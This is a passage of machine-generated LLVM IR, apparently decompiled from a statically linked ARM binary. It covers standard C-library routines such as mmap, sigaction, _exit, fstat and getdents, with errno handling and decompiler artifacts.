  store i32 %v4_1e568, i32* %ip.global-to-local, align 4
  store i32 %v2_1e540, i32* %r3.global-to-local, align 4
  %v2_1e578 = add i32 %v0_1e550, -1040
  %v3_1e578 = inttoptr i32 %v2_1e578 to i32*
  store i32 %v2_1e540, i32* %v3_1e578, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_1e584 = load i32, i32* %ip.global-to-local, align 4
  %v1_1e584 = inttoptr i32 %v0_1e584 to i32*
  %v2_1e584 = load i32, i32* %v1_1e584, align 4
  store i32 %v2_1e584, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_1e594 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e638

dec_label_pc_1e59c:                               ; preds = %dec_label_pc_1e540
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_1e5a0 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1e5a0, i32* %ip.global-to-local, align 4
  %v2_1e5a4 = add i32 %v2_1e5a0, 40
  %v3_1e5a4 = inttoptr i32 %v2_1e5a4 to i32*
  %v4_1e5a4 = load i32, i32* %v3_1e5a4, align 4
  store i32 %v4_1e5a4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1e5a4)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_1e5b4 = load i32, i32* %stack_var_-416, align 4
  %v2_1e5b8 = add i32 %v2_1e5b4, 120
  %v3_1e5b8 = inttoptr i32 %v2_1e5b8 to i32*
  %v4_1e5b8 = load i32, i32* %v3_1e5b8, align 4
  store i32 %v4_1e5b8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1e5bc

dec_label_pc_1e5bc:                               ; preds = %dec_label_pc_1e5f0.dec_label_pc_1e5bc_crit_edge, %dec_label_pc_1e59c
  %v0_1e5bc = phi i32 [ %v0_1e5bc.pre, %dec_label_pc_1e5f0.dec_label_pc_1e5bc_crit_edge ], [ %v4_1e5b8, %dec_label_pc_1e59c ]
  %v1_1e5bc = inttoptr i32 %v0_1e5bc to i32*
  %v2_1e5bc = load i32, i32* %v1_1e5bc, align 4
  store i32 %v0_1e5bc, i32* %r2.global-to-local, align 4
  store i32 %v2_1e5bc, i32* %r4.global-to-local, align 4
  %v1_1e5c8 = add i32 %v2_1e5bc, -1
  store i32 %v1_1e5c8, i32* %r1.global-to-local, align 4
  %v2_1e5cc89 = load i32, i32* %v1_1e5bc, align 4
  store i32 %v2_1e5cc89, i32* %r3.global-to-local, align 4
  %v3_1e5d091 = icmp uge i32 %v2_1e5cc89, %v2_1e5bc
  store i1 %v3_1e5d091, i1* %cpsr_c.global-to-local, align 1
  %v9_1e5d097 = icmp eq i32 %v2_1e5cc89, %v2_1e5bc
  store i1 %v9_1e5d097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1e5d097, label %dec_label_pc_1e5d8, label %dec_label_pc_1e5f0

dec_label_pc_1e5d8:                               ; preds = %dec_label_pc_1e5bc, %dec_label_pc_1e5d8.dec_label_pc_1e5cc_crit_edge
  %v0_1e5d898 = phi i32 [ %v1_1e5d0.pre, %dec_label_pc_1e5d8.dec_label_pc_1e5cc_crit_edge ], [ %v2_1e5bc, %dec_label_pc_1e5bc ]
  store i32 %v0_1e5d898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1e5e8 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1e5e8, label %dec_label_pc_1e5ec, label %dec_label_pc_1e5d8.dec_label_pc_1e5cc_crit_edge

dec_label_pc_1e5d8.dec_label_pc_1e5cc_crit_edge:  ; preds = %dec_label_pc_1e5d8
  %v0_1e5cc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1e5d0.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_1e5cc = inttoptr i32 %v0_1e5cc.pre to i32*
  %v2_1e5cc = load i32, i32* %v1_1e5cc, align 4
  store i32 %v2_1e5cc, i32* %r3.global-to-local, align 4
  %v3_1e5d0 = icmp uge i32 %v2_1e5cc, %v1_1e5d0.pre
  store i1 %v3_1e5d0, i1* %cpsr_c.global-to-local, align 1
  %v9_1e5d0 = icmp eq i32 %v2_1e5cc, %v1_1e5d0.pre
  store i1 %v9_1e5d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1e5d0, label %dec_label_pc_1e5d8, label %dec_label_pc_1e5f0

dec_label_pc_1e5ec:                               ; preds = %dec_label_pc_1e5d8
  %v0_1e5ec = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1e5ec, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1e5f0

dec_label_pc_1e5f0:                               ; preds = %dec_label_pc_1e5bc, %dec_label_pc_1e5d8.dec_label_pc_1e5cc_crit_edge, %dec_label_pc_1e5ec
  %v0_1e5f8 = phi i32 [ %v0_1e5ec, %dec_label_pc_1e5ec ], [ %v2_1e5cc89, %dec_label_pc_1e5bc ], [ %v2_1e5cc, %dec_label_pc_1e5d8.dec_label_pc_1e5cc_crit_edge ]
  %v1_1e5f0 = phi i32 [ %v0_1e5ec, %dec_label_pc_1e5ec ], [ %v2_1e5bc, %dec_label_pc_1e5bc ], [ %v1_1e5d0.pre, %dec_label_pc_1e5d8.dec_label_pc_1e5cc_crit_edge ]
  %v3_1e5f0 = icmp uge i32 %v0_1e5f8, %v1_1e5f0
  store i1 %v3_1e5f0, i1* %cpsr_c.global-to-local, align 1
  %v9_1e5f0 = icmp eq i32 %v0_1e5f8, %v1_1e5f0
  store i1 %v9_1e5f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1e5f0, label %dec_label_pc_1e5f8, label %dec_label_pc_1e5f0.dec_label_pc_1e5bc_crit_edge

dec_label_pc_1e5f0.dec_label_pc_1e5bc_crit_edge:  ; preds = %dec_label_pc_1e5f0
  %v0_1e5bc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1e5bc

dec_label_pc_1e5f8:                               ; preds = %dec_label_pc_1e5f0
  %v2_1e5f8 = icmp ne i32 %v1_1e5f0, 0
  store i1 %v2_1e5f8, i1* %cpsr_c.global-to-local, align 1
  %v7_1e5f8 = icmp eq i32 %v1_1e5f0, 1
  store i1 %v7_1e5f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1e5f8, label %dec_label_pc_1e638, label %dec_label_pc_1e600

dec_label_pc_1e600:                               ; preds = %dec_label_pc_1e5f8
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1e638

dec_label_pc_1e638:                               ; preds = %dec_label_pc_1e5f8, %dec_label_pc_1e600, %dec_label_pc_1e550
  %storemerge2 = phi i32 [ %v0_1e594, %dec_label_pc_1e550 ], [ 0, %dec_label_pc_1e600 ], [ 0, %dec_label_pc_1e5f8 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_1e63c = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_1e63c, i32* %r0.global-to-local, align 4
  %v0_1e640 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1e640, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_1e638
  %v2_1e644 = load i32, i32* @r8, align 4
  %v8_1e644 = shl i32 %v2_1e644, %v1_1e63c
  %v9_1e644 = and i32 %v8_1e644, %v1_1e63c
  %v8_1e648 = lshr i32 %v2_1e644, %v9_1e644
  %v9_1e648 = and i32 %v8_1e648, %v9_1e644
  %v5_1e64c = mul i32 %v9_1e648, 65536
  %v6_1e64c = and i32 %v5_1e64c, %v9_1e648
  %v1_1e650 = load i32, i32* %r4.global-to-local, align 4
  %v3_1e650 = mul i32 %v6_1e64c, %v1_1e650
  %v2_1e658 = load i32, i32* %ip.global-to-local, align 4
  %v5_1e658 = mul i32 %v2_1e658, 4
  %v5_1e65c = udiv i32 %v1_1e650, 2
  %v6_1e658 = and i32 %v5_1e658, %v5_1e65c
  %v6_1e65c = and i32 %v6_1e658, %v3_1e650
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_1e65c, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_1e638, %bb85
  %v5_1e660 = phi i32 [ %v1_1e63c, %dec_label_pc_1e638 ], [ %v6_1e65c, %bb85 ]
  ret i32 %v5_1e660

; uselistorder directives
  uselistorder i32 %v9_1e648, { 1, 0 }
  uselistorder i32 %v1_1e63c, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_1e5f0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1e5ec, { 1, 0, 2 }
  uselistorder i32 %v1_1e5d0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1e5bc, { 1, 0 }
  uselistorder i32 %v2_1e51c, { 1, 0 }
  uselistorder i32 %v2_1e4f4.pre, { 2, 0, 1 }
  uselistorder i32 %v1_1e4e8, { 1, 0 }
  uselistorder i32 %v1_1e4e4, { 3, 2, 1, 0 }
  uselistorder i32 %v1_1e4d8, { 1, 0 }
  uselistorder i32 %v1_1e4a4, { 1, 0 }
  uselistorder i32 %v1_1e4a0, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1e494, { 1, 0 }
  uselistorder i32 %v2_1e470, { 1, 0, 2 }
  uselistorder i32 %v4_1e454, { 1, 0, 2 }
  uselistorder i1 %v8_1e38c, { 1, 2, 0 }
  uselistorder i32 %v2_1e358, { 1, 2, 0 }
  uselistorder i32 %v1_1e354, { 1, 2, 0 }
  uselistorder i1 %v2_1e340, { 1, 0, 2 }
  uselistorder i32 %v5_1e344, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1e310, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1e2ec, { 1, 0, 2 }
  uselistorder i32 %v3_1e2bc, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 3, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 2, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 7, 4, 5, 6, 8, 9, 10, 12, 11, 13, 14, 15, 3, 1, 2, 16, 17, 18, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7, 9, 8, 10, 11 }
  uselistorder i1* %cpsr_z.global-to-local, { 7, 3, 4, 5, 6, 2, 8, 9, 10, 11, 0, 12, 13, 26, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 1, 25 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 3, 10, 11, 12, 14, 13, 0, 15, 17, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 2, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 9, 8, 7, 2, 1, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 2, 0, 1 }
  uselistorder i32 120, { 0, 2, 1, 5, 4, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_1e638, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1e5f0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1e5d8, { 1, 0 }
  uselistorder label %dec_label_pc_1e540, { 1, 0 }
  uselistorder label %dec_label_pc_1e518, { 1, 0 }
  uselistorder label %dec_label_pc_1e494, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1e410, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1e3e8, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_1e358, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_1e340, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1e68c = load i32, i32* @r4, align 4
  store i32 %v3_1e68c, i32* %stack_var_-16, align 4
  %v3_1e698 = urem i32 %arg3, 4096
  %v2_1e69c = icmp eq i32 %v3_1e698, 0
  br i1 %v2_1e69c, label %dec_label_pc_1e6c0, label %dec_label_pc_1e6a4

dec_label_pc_1e6a4:                               ; preds = %entry
  %v0_1e6a8 = call i32 @__aeabi_read_tp()
  store i32 %v0_1e6a8, i32* %r0.global-to-local, align 4
  %v3_1e6ac = load i16, i16* @global_var_2c068.414, align 2
  %v4_1e6ac = sext i16 %v3_1e6ac to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_1e6b8 = add i32 %v4_1e6ac, %v0_1e6a8
  %v4_1e6b8 = inttoptr i32 %v3_1e6b8 to i32*
  store i32 22, i32* %v4_1e6b8, align 4
  %v0_1e6f4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1e6f4

dec_label_pc_1e6c0:                               ; preds = %entry
  %v0_1e6d0 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1e6d0, -4095
  br i1 %tmp, label %dec_label_pc_1e6f0, label %dec_label_pc_1e6d8

dec_label_pc_1e6d8:                               ; preds = %dec_label_pc_1e6c0
  %v1_1e6dc = sub i32 0, %v0_1e6d0
  %v3_1e6e0 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1e6e0 = sext i16 %v3_1e6e0 to i32
  %v0_1e6e4 = call i32 @__aeabi_read_tp()
  %v3_1e6e8 = add i32 %v4_1e6e0, %v0_1e6e4
  %v4_1e6e8 = inttoptr i32 %v3_1e6e8 to i32*
  store i32 %v1_1e6dc, i32* %v4_1e6e8, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1e6f0

dec_label_pc_1e6f0:                               ; preds = %dec_label_pc_1e6c0, %dec_label_pc_1e6d8
  %v0_1e6f0 = phi i32 [ %v0_1e6d0, %dec_label_pc_1e6c0 ], [ -1, %dec_label_pc_1e6d8 ]
  store i32 %v0_1e6f0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1e6f4

dec_label_pc_1e6f4:                               ; preds = %dec_label_pc_1e6a4, %dec_label_pc_1e6f0
  %v0_1e6f4 = phi i32 [ %v0_1e6f4.pre, %dec_label_pc_1e6a4 ], [ %v0_1e6f0, %dec_label_pc_1e6f0 ]
  store i32 %v0_1e6f4, i32* %r0.global-to-local, align 4
  %v2_1e6f8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1e6f8, i32* @r4, align 4
  ret i32 %v0_1e6f4

; uselistorder directives
  uselistorder i32 %v0_1e6f4, { 1, 0 }
  uselistorder i32 %v0_1e6d0, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_1e6f4, { 1, 0 }
  uselistorder label %dec_label_pc_1e6f0, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_1e708 = load i32, i32* @lr, align 4
  store i32 %v0_1e708, i32* %stack_var_-4, align 4
  %v0_1e710 = load i32, i32* @r0, align 4
  %v3_1e714 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1e714 = sext i16 %v3_1e714 to i32
  store i32 %v4_1e714, i32* @r2, align 4
  %v0_1e718 = call i32 @__aeabi_read_tp()
  %v1_1e71c = sub i32 0, %v0_1e710
  store i32 %v1_1e71c, i32* @r3, align 4
  %v2_1e720 = load i32, i32* @r2, align 4
  %v3_1e720 = add i32 %v2_1e720, %v0_1e718
  %v4_1e720 = inttoptr i32 %v3_1e720 to i32*
  store i32 %v1_1e71c, i32* %v4_1e720, align 4
  %v2_1e728 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_1e728, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1e734 = load i32, i32* @r4, align 4
  %v6_1e734 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_1e73c = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_2c010.418 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_1e73c, label %dec_label_pc_1e790, label %dec_label_pc_1e754

dec_label_pc_1e754:                               ; preds = %entry
  %v1_1e754 = add i32 %arg2, 4
  %v2_1e754 = inttoptr i32 %v1_1e754 to i32*
  %v3_1e754 = load i32, i32* %v2_1e754, align 4
  store i32 %v3_1e754, i32* @r3, align 4
  %v1_1e758 = and i32 %v3_1e754, 67108864
  %v2_1e758 = icmp eq i32 %v1_1e758, 0
  br i1 %v2_1e758, label %dec_label_pc_1e760, label %dec_label_pc_1e790

dec_label_pc_1e760:                               ; preds = %dec_label_pc_1e754
  store i32 20, i32* @r2, align 4
  %v2_1e764 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1e764, i32* @r0, align 4
  %v0_1e768 = call i32 @memcpy()
  %v0_1e790.pre = load i32, i32* @r5, align 4
  %v0_1e798.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1e790

dec_label_pc_1e790:                               ; preds = %dec_label_pc_1e754, %entry, %dec_label_pc_1e760
  %v0_1e798 = phi i32 [ %arg3, %dec_label_pc_1e754 ], [ %arg3, %entry ], [ %v0_1e798.pre, %dec_label_pc_1e760 ]
  %v0_1e794 = phi i32 [ %arg2, %dec_label_pc_1e754 ], [ 0, %entry ], [ %v2_1e764, %dec_label_pc_1e760 ]
  %v0_1e790 = phi i32 [ %arg1, %dec_label_pc_1e754 ], [ %arg1, %entry ], [ %v0_1e790.pre, %dec_label_pc_1e760 ]
  store i32 8, i32* @r3, align 4
  %v4_1e7a0 = call i32 @__syscall_rt_sigaction(i32 %v0_1e790, i32 %v0_1e794, i32 %v0_1e798, i32 8)
  store i32 %v3_1e734, i32* @r4, align 4
  store i32 %v6_1e734, i32* @r5, align 4
  ret i32 %v4_1e7a0

; uselistorder directives
  uselistorder i32 67108864, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1e790, { 2, 0, 1 }
}

define i32 @function_1e7b4(i32 %arg1) local_unnamed_addr {
dec_label_pc_1e7b4:
  %v0_1e7b4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1e7b4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1e7b4
  %v2_1e7b4 = load i32, i32* @r8, align 4
  %v4_1e7b4 = mul i32 %v2_1e7b4, 2
  %v5_1e7b4 = and i32 %v4_1e7b4, %arg1
  %v2_1e7b8 = load i32, i32* @ip, align 4
  %v4_1e7b8 = lshr i32 %v2_1e7b8, %v5_1e7b4
  %v5_1e7b8 = sub i32 32, %v5_1e7b4
  %v6_1e7b8 = shl i32 %v2_1e7b8, %v5_1e7b8
  %v7_1e7b8 = or i32 %v6_1e7b8, %v4_1e7b8
  %v9_1e7b8 = and i32 %v7_1e7b8, %v5_1e7b4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1e7b4, %bb
  %v10_1e7b8 = phi i32 [ %arg1, %dec_label_pc_1e7b4 ], [ %v9_1e7b8, %bb ]
  ret i32 %v10_1e7b8

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_1e7c0 = call i32 @__sigsetjmp()
  ret i32 %v0_1e7c0
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1e7f0 = load i32, i32* @r7, align 4
  store i32 %v3_1e7f0, i32* %stack_var_-8, align 4
  %v0_1e7fc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1e7fc, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_1e7fc, -4095
  br i1 %tmp, label %dec_label_pc_1e824, label %dec_label_pc_1e80c

dec_label_pc_1e80c:                               ; preds = %entry
  %v0_1e810 = call i32 @__aeabi_read_tp()
  %v3_1e814 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1e814 = sext i16 %v3_1e814 to i32
  store i32 %v4_1e814, i32* @r3, align 4
  %v0_1e818 = load i32, i32* @r2, align 4
  %v1_1e818 = sub i32 0, %v0_1e818
  store i32 %v1_1e818, i32* @r2, align 4
  %v3_1e81c = add i32 %v4_1e814, %v0_1e810
  %v4_1e81c = inttoptr i32 %v3_1e81c to i32*
  store i32 %v1_1e818, i32* %v4_1e81c, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_1e824.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1e824

dec_label_pc_1e824:                               ; preds = %entry, %dec_label_pc_1e80c
  %v1_1e828 = phi i32 [ %v0_1e7fc, %entry ], [ -1, %dec_label_pc_1e80c ]
  %v2_1e824 = phi i32 [ %v3_1e7f0, %entry ], [ %v2_1e824.pre, %dec_label_pc_1e80c ]
  store i32 %v2_1e824, i32* @r7, align 4
  ret i32 %v1_1e828

; uselistorder directives
  uselistorder i32 %v0_1e7fc, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1e824, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1e83c

dec_label_pc_1e83c:                               ; preds = %dec_label_pc_1e868, %dec_label_pc_1e87c, %entry
  %v0_1e83c = phi i32 [ %arg1, %entry ], [ %v0_1e83c.pre.pre, %dec_label_pc_1e87c ], [ %v0_1e868, %dec_label_pc_1e868 ]
  store i32 %v0_1e83c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1e83c, -4095
  br i1 %tmp, label %dec_label_pc_1e868, label %dec_label_pc_1e858

dec_label_pc_1e858:                               ; preds = %dec_label_pc_1e83c
  %v0_1e858 = call i32 @__aeabi_read_tp()
  %v0_1e85c = load i32, i32* %r2.global-to-local, align 4
  %v1_1e85c = sub i32 0, %v0_1e85c
  store i32 %v1_1e85c, i32* %r2.global-to-local, align 4
  %v3_1e860 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1e860 = sext i16 %v3_1e860 to i32
  %v3_1e864 = add i32 %v4_1e860, %v0_1e858
  %v4_1e864 = inttoptr i32 %v3_1e864 to i32*
  store i32 %v1_1e85c, i32* %v4_1e864, align 4
  %v0_1e868.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1e868

dec_label_pc_1e868:                               ; preds = %dec_label_pc_1e83c, %dec_label_pc_1e858
  %v0_1e868 = phi i32 [ %v0_1e83c, %dec_label_pc_1e83c ], [ %v0_1e868.pre, %dec_label_pc_1e858 ]
  store i32 %v0_1e868, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_1e868, -4095
  br i1 %tmp4, label %dec_label_pc_1e83c, label %dec_label_pc_1e87c

dec_label_pc_1e87c:                               ; preds = %dec_label_pc_1e868
  %v0_1e87c = call i32 @__aeabi_read_tp()
  %v0_1e880 = load i32, i32* %r2.global-to-local, align 4
  %v1_1e880 = sub i32 0, %v0_1e880
  store i32 %v1_1e880, i32* %r2.global-to-local, align 4
  %v3_1e884 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1e884 = sext i16 %v3_1e884 to i32
  %v3_1e888 = add i32 %v4_1e884, %v0_1e87c
  %v4_1e888 = inttoptr i32 %v3_1e888 to i32*
  store i32 %v1_1e880, i32* %v4_1e888, align 4
  %v0_1e83c.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1e83c

; uselistorder directives
  uselistorder i32 %v0_1e868, { 0, 2, 1 }
  uselistorder i32 %v0_1e83c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1e868, { 1, 0 }
  uselistorder label %dec_label_pc_1e83c, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %v0_1e8a0 = load i32, i32* @r1, align 4
  store i32 %v0_1e8a0, i32* @r3, align 4
  store i32 197, i32* %r7.global-to-local, align 4
  %v0_1e8b0 = load i32, i32* @r0, align 4
  store i32 %v0_1e8b0, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_1e8b0, -4095
  br i1 %tmp, label %dec_label_pc_1e8d8, label %dec_label_pc_1e8bc

dec_label_pc_1e8bc:                               ; preds = %entry
  %v0_1e8c0 = call i32 @__aeabi_read_tp()
  %v3_1e8c4 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1e8c4 = sext i16 %v3_1e8c4 to i32
  store i32 %v4_1e8c4, i32* @r3, align 4
  %v0_1e8c8 = load i32, i32* @r2, align 4
  %v1_1e8c8 = sub i32 0, %v0_1e8c8
  store i32 %v1_1e8c8, i32* @r2, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v3_1e8d0 = add i32 %v4_1e8c4, %v0_1e8c0
  %v4_1e8d0 = inttoptr i32 %v3_1e8d0 to i32*
  store i32 %v1_1e8c8, i32* %v4_1e8d0, align 4
  br label %dec_label_pc_1e8e8

dec_label_pc_1e8d8:                               ; preds = %entry
  store i32 %v0_1e8b0, i32* %r7.global-to-local, align 4
  %v2_1e8d8 = icmp eq i32 %v0_1e8b0, 0
  br i1 %v2_1e8d8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1e8d8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1e8d8, %bb
  call void @__pseudo_cond_branch(i1 %v2_1e8d8, i32 ptrtoint (i32* @global_var_1ed28.647 to i32))
  br label %dec_label_pc_1e8e8

dec_label_pc_1e8e8:                               ; preds = %dec_label_pc_1e8bc, %.thread
  %v0_1e8e8 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1e8e8

; uselistorder directives
  uselistorder i32 %v0_1e8b0, { 1, 2, 0, 3 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1e8e8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__getdents(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_1e8fc = load i32, i32* @r5, align 4
  %v18_1e8fc = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1e934, label %dec_label_pc_1e918

dec_label_pc_1e918:                               ; preds = %entry
  %v1_1e91c = sub i32 0, %arg1
  %v3_1e920 = load i16, i16* @global_var_2c068.414, align 2
  %v4_1e920 = sext i16 %v3_1e920 to i32
  store i32 %v4_1e920, i32* %r3.global-to-local, align 4
  %v0_1e924 = call i32 @__aeabi_read_tp()
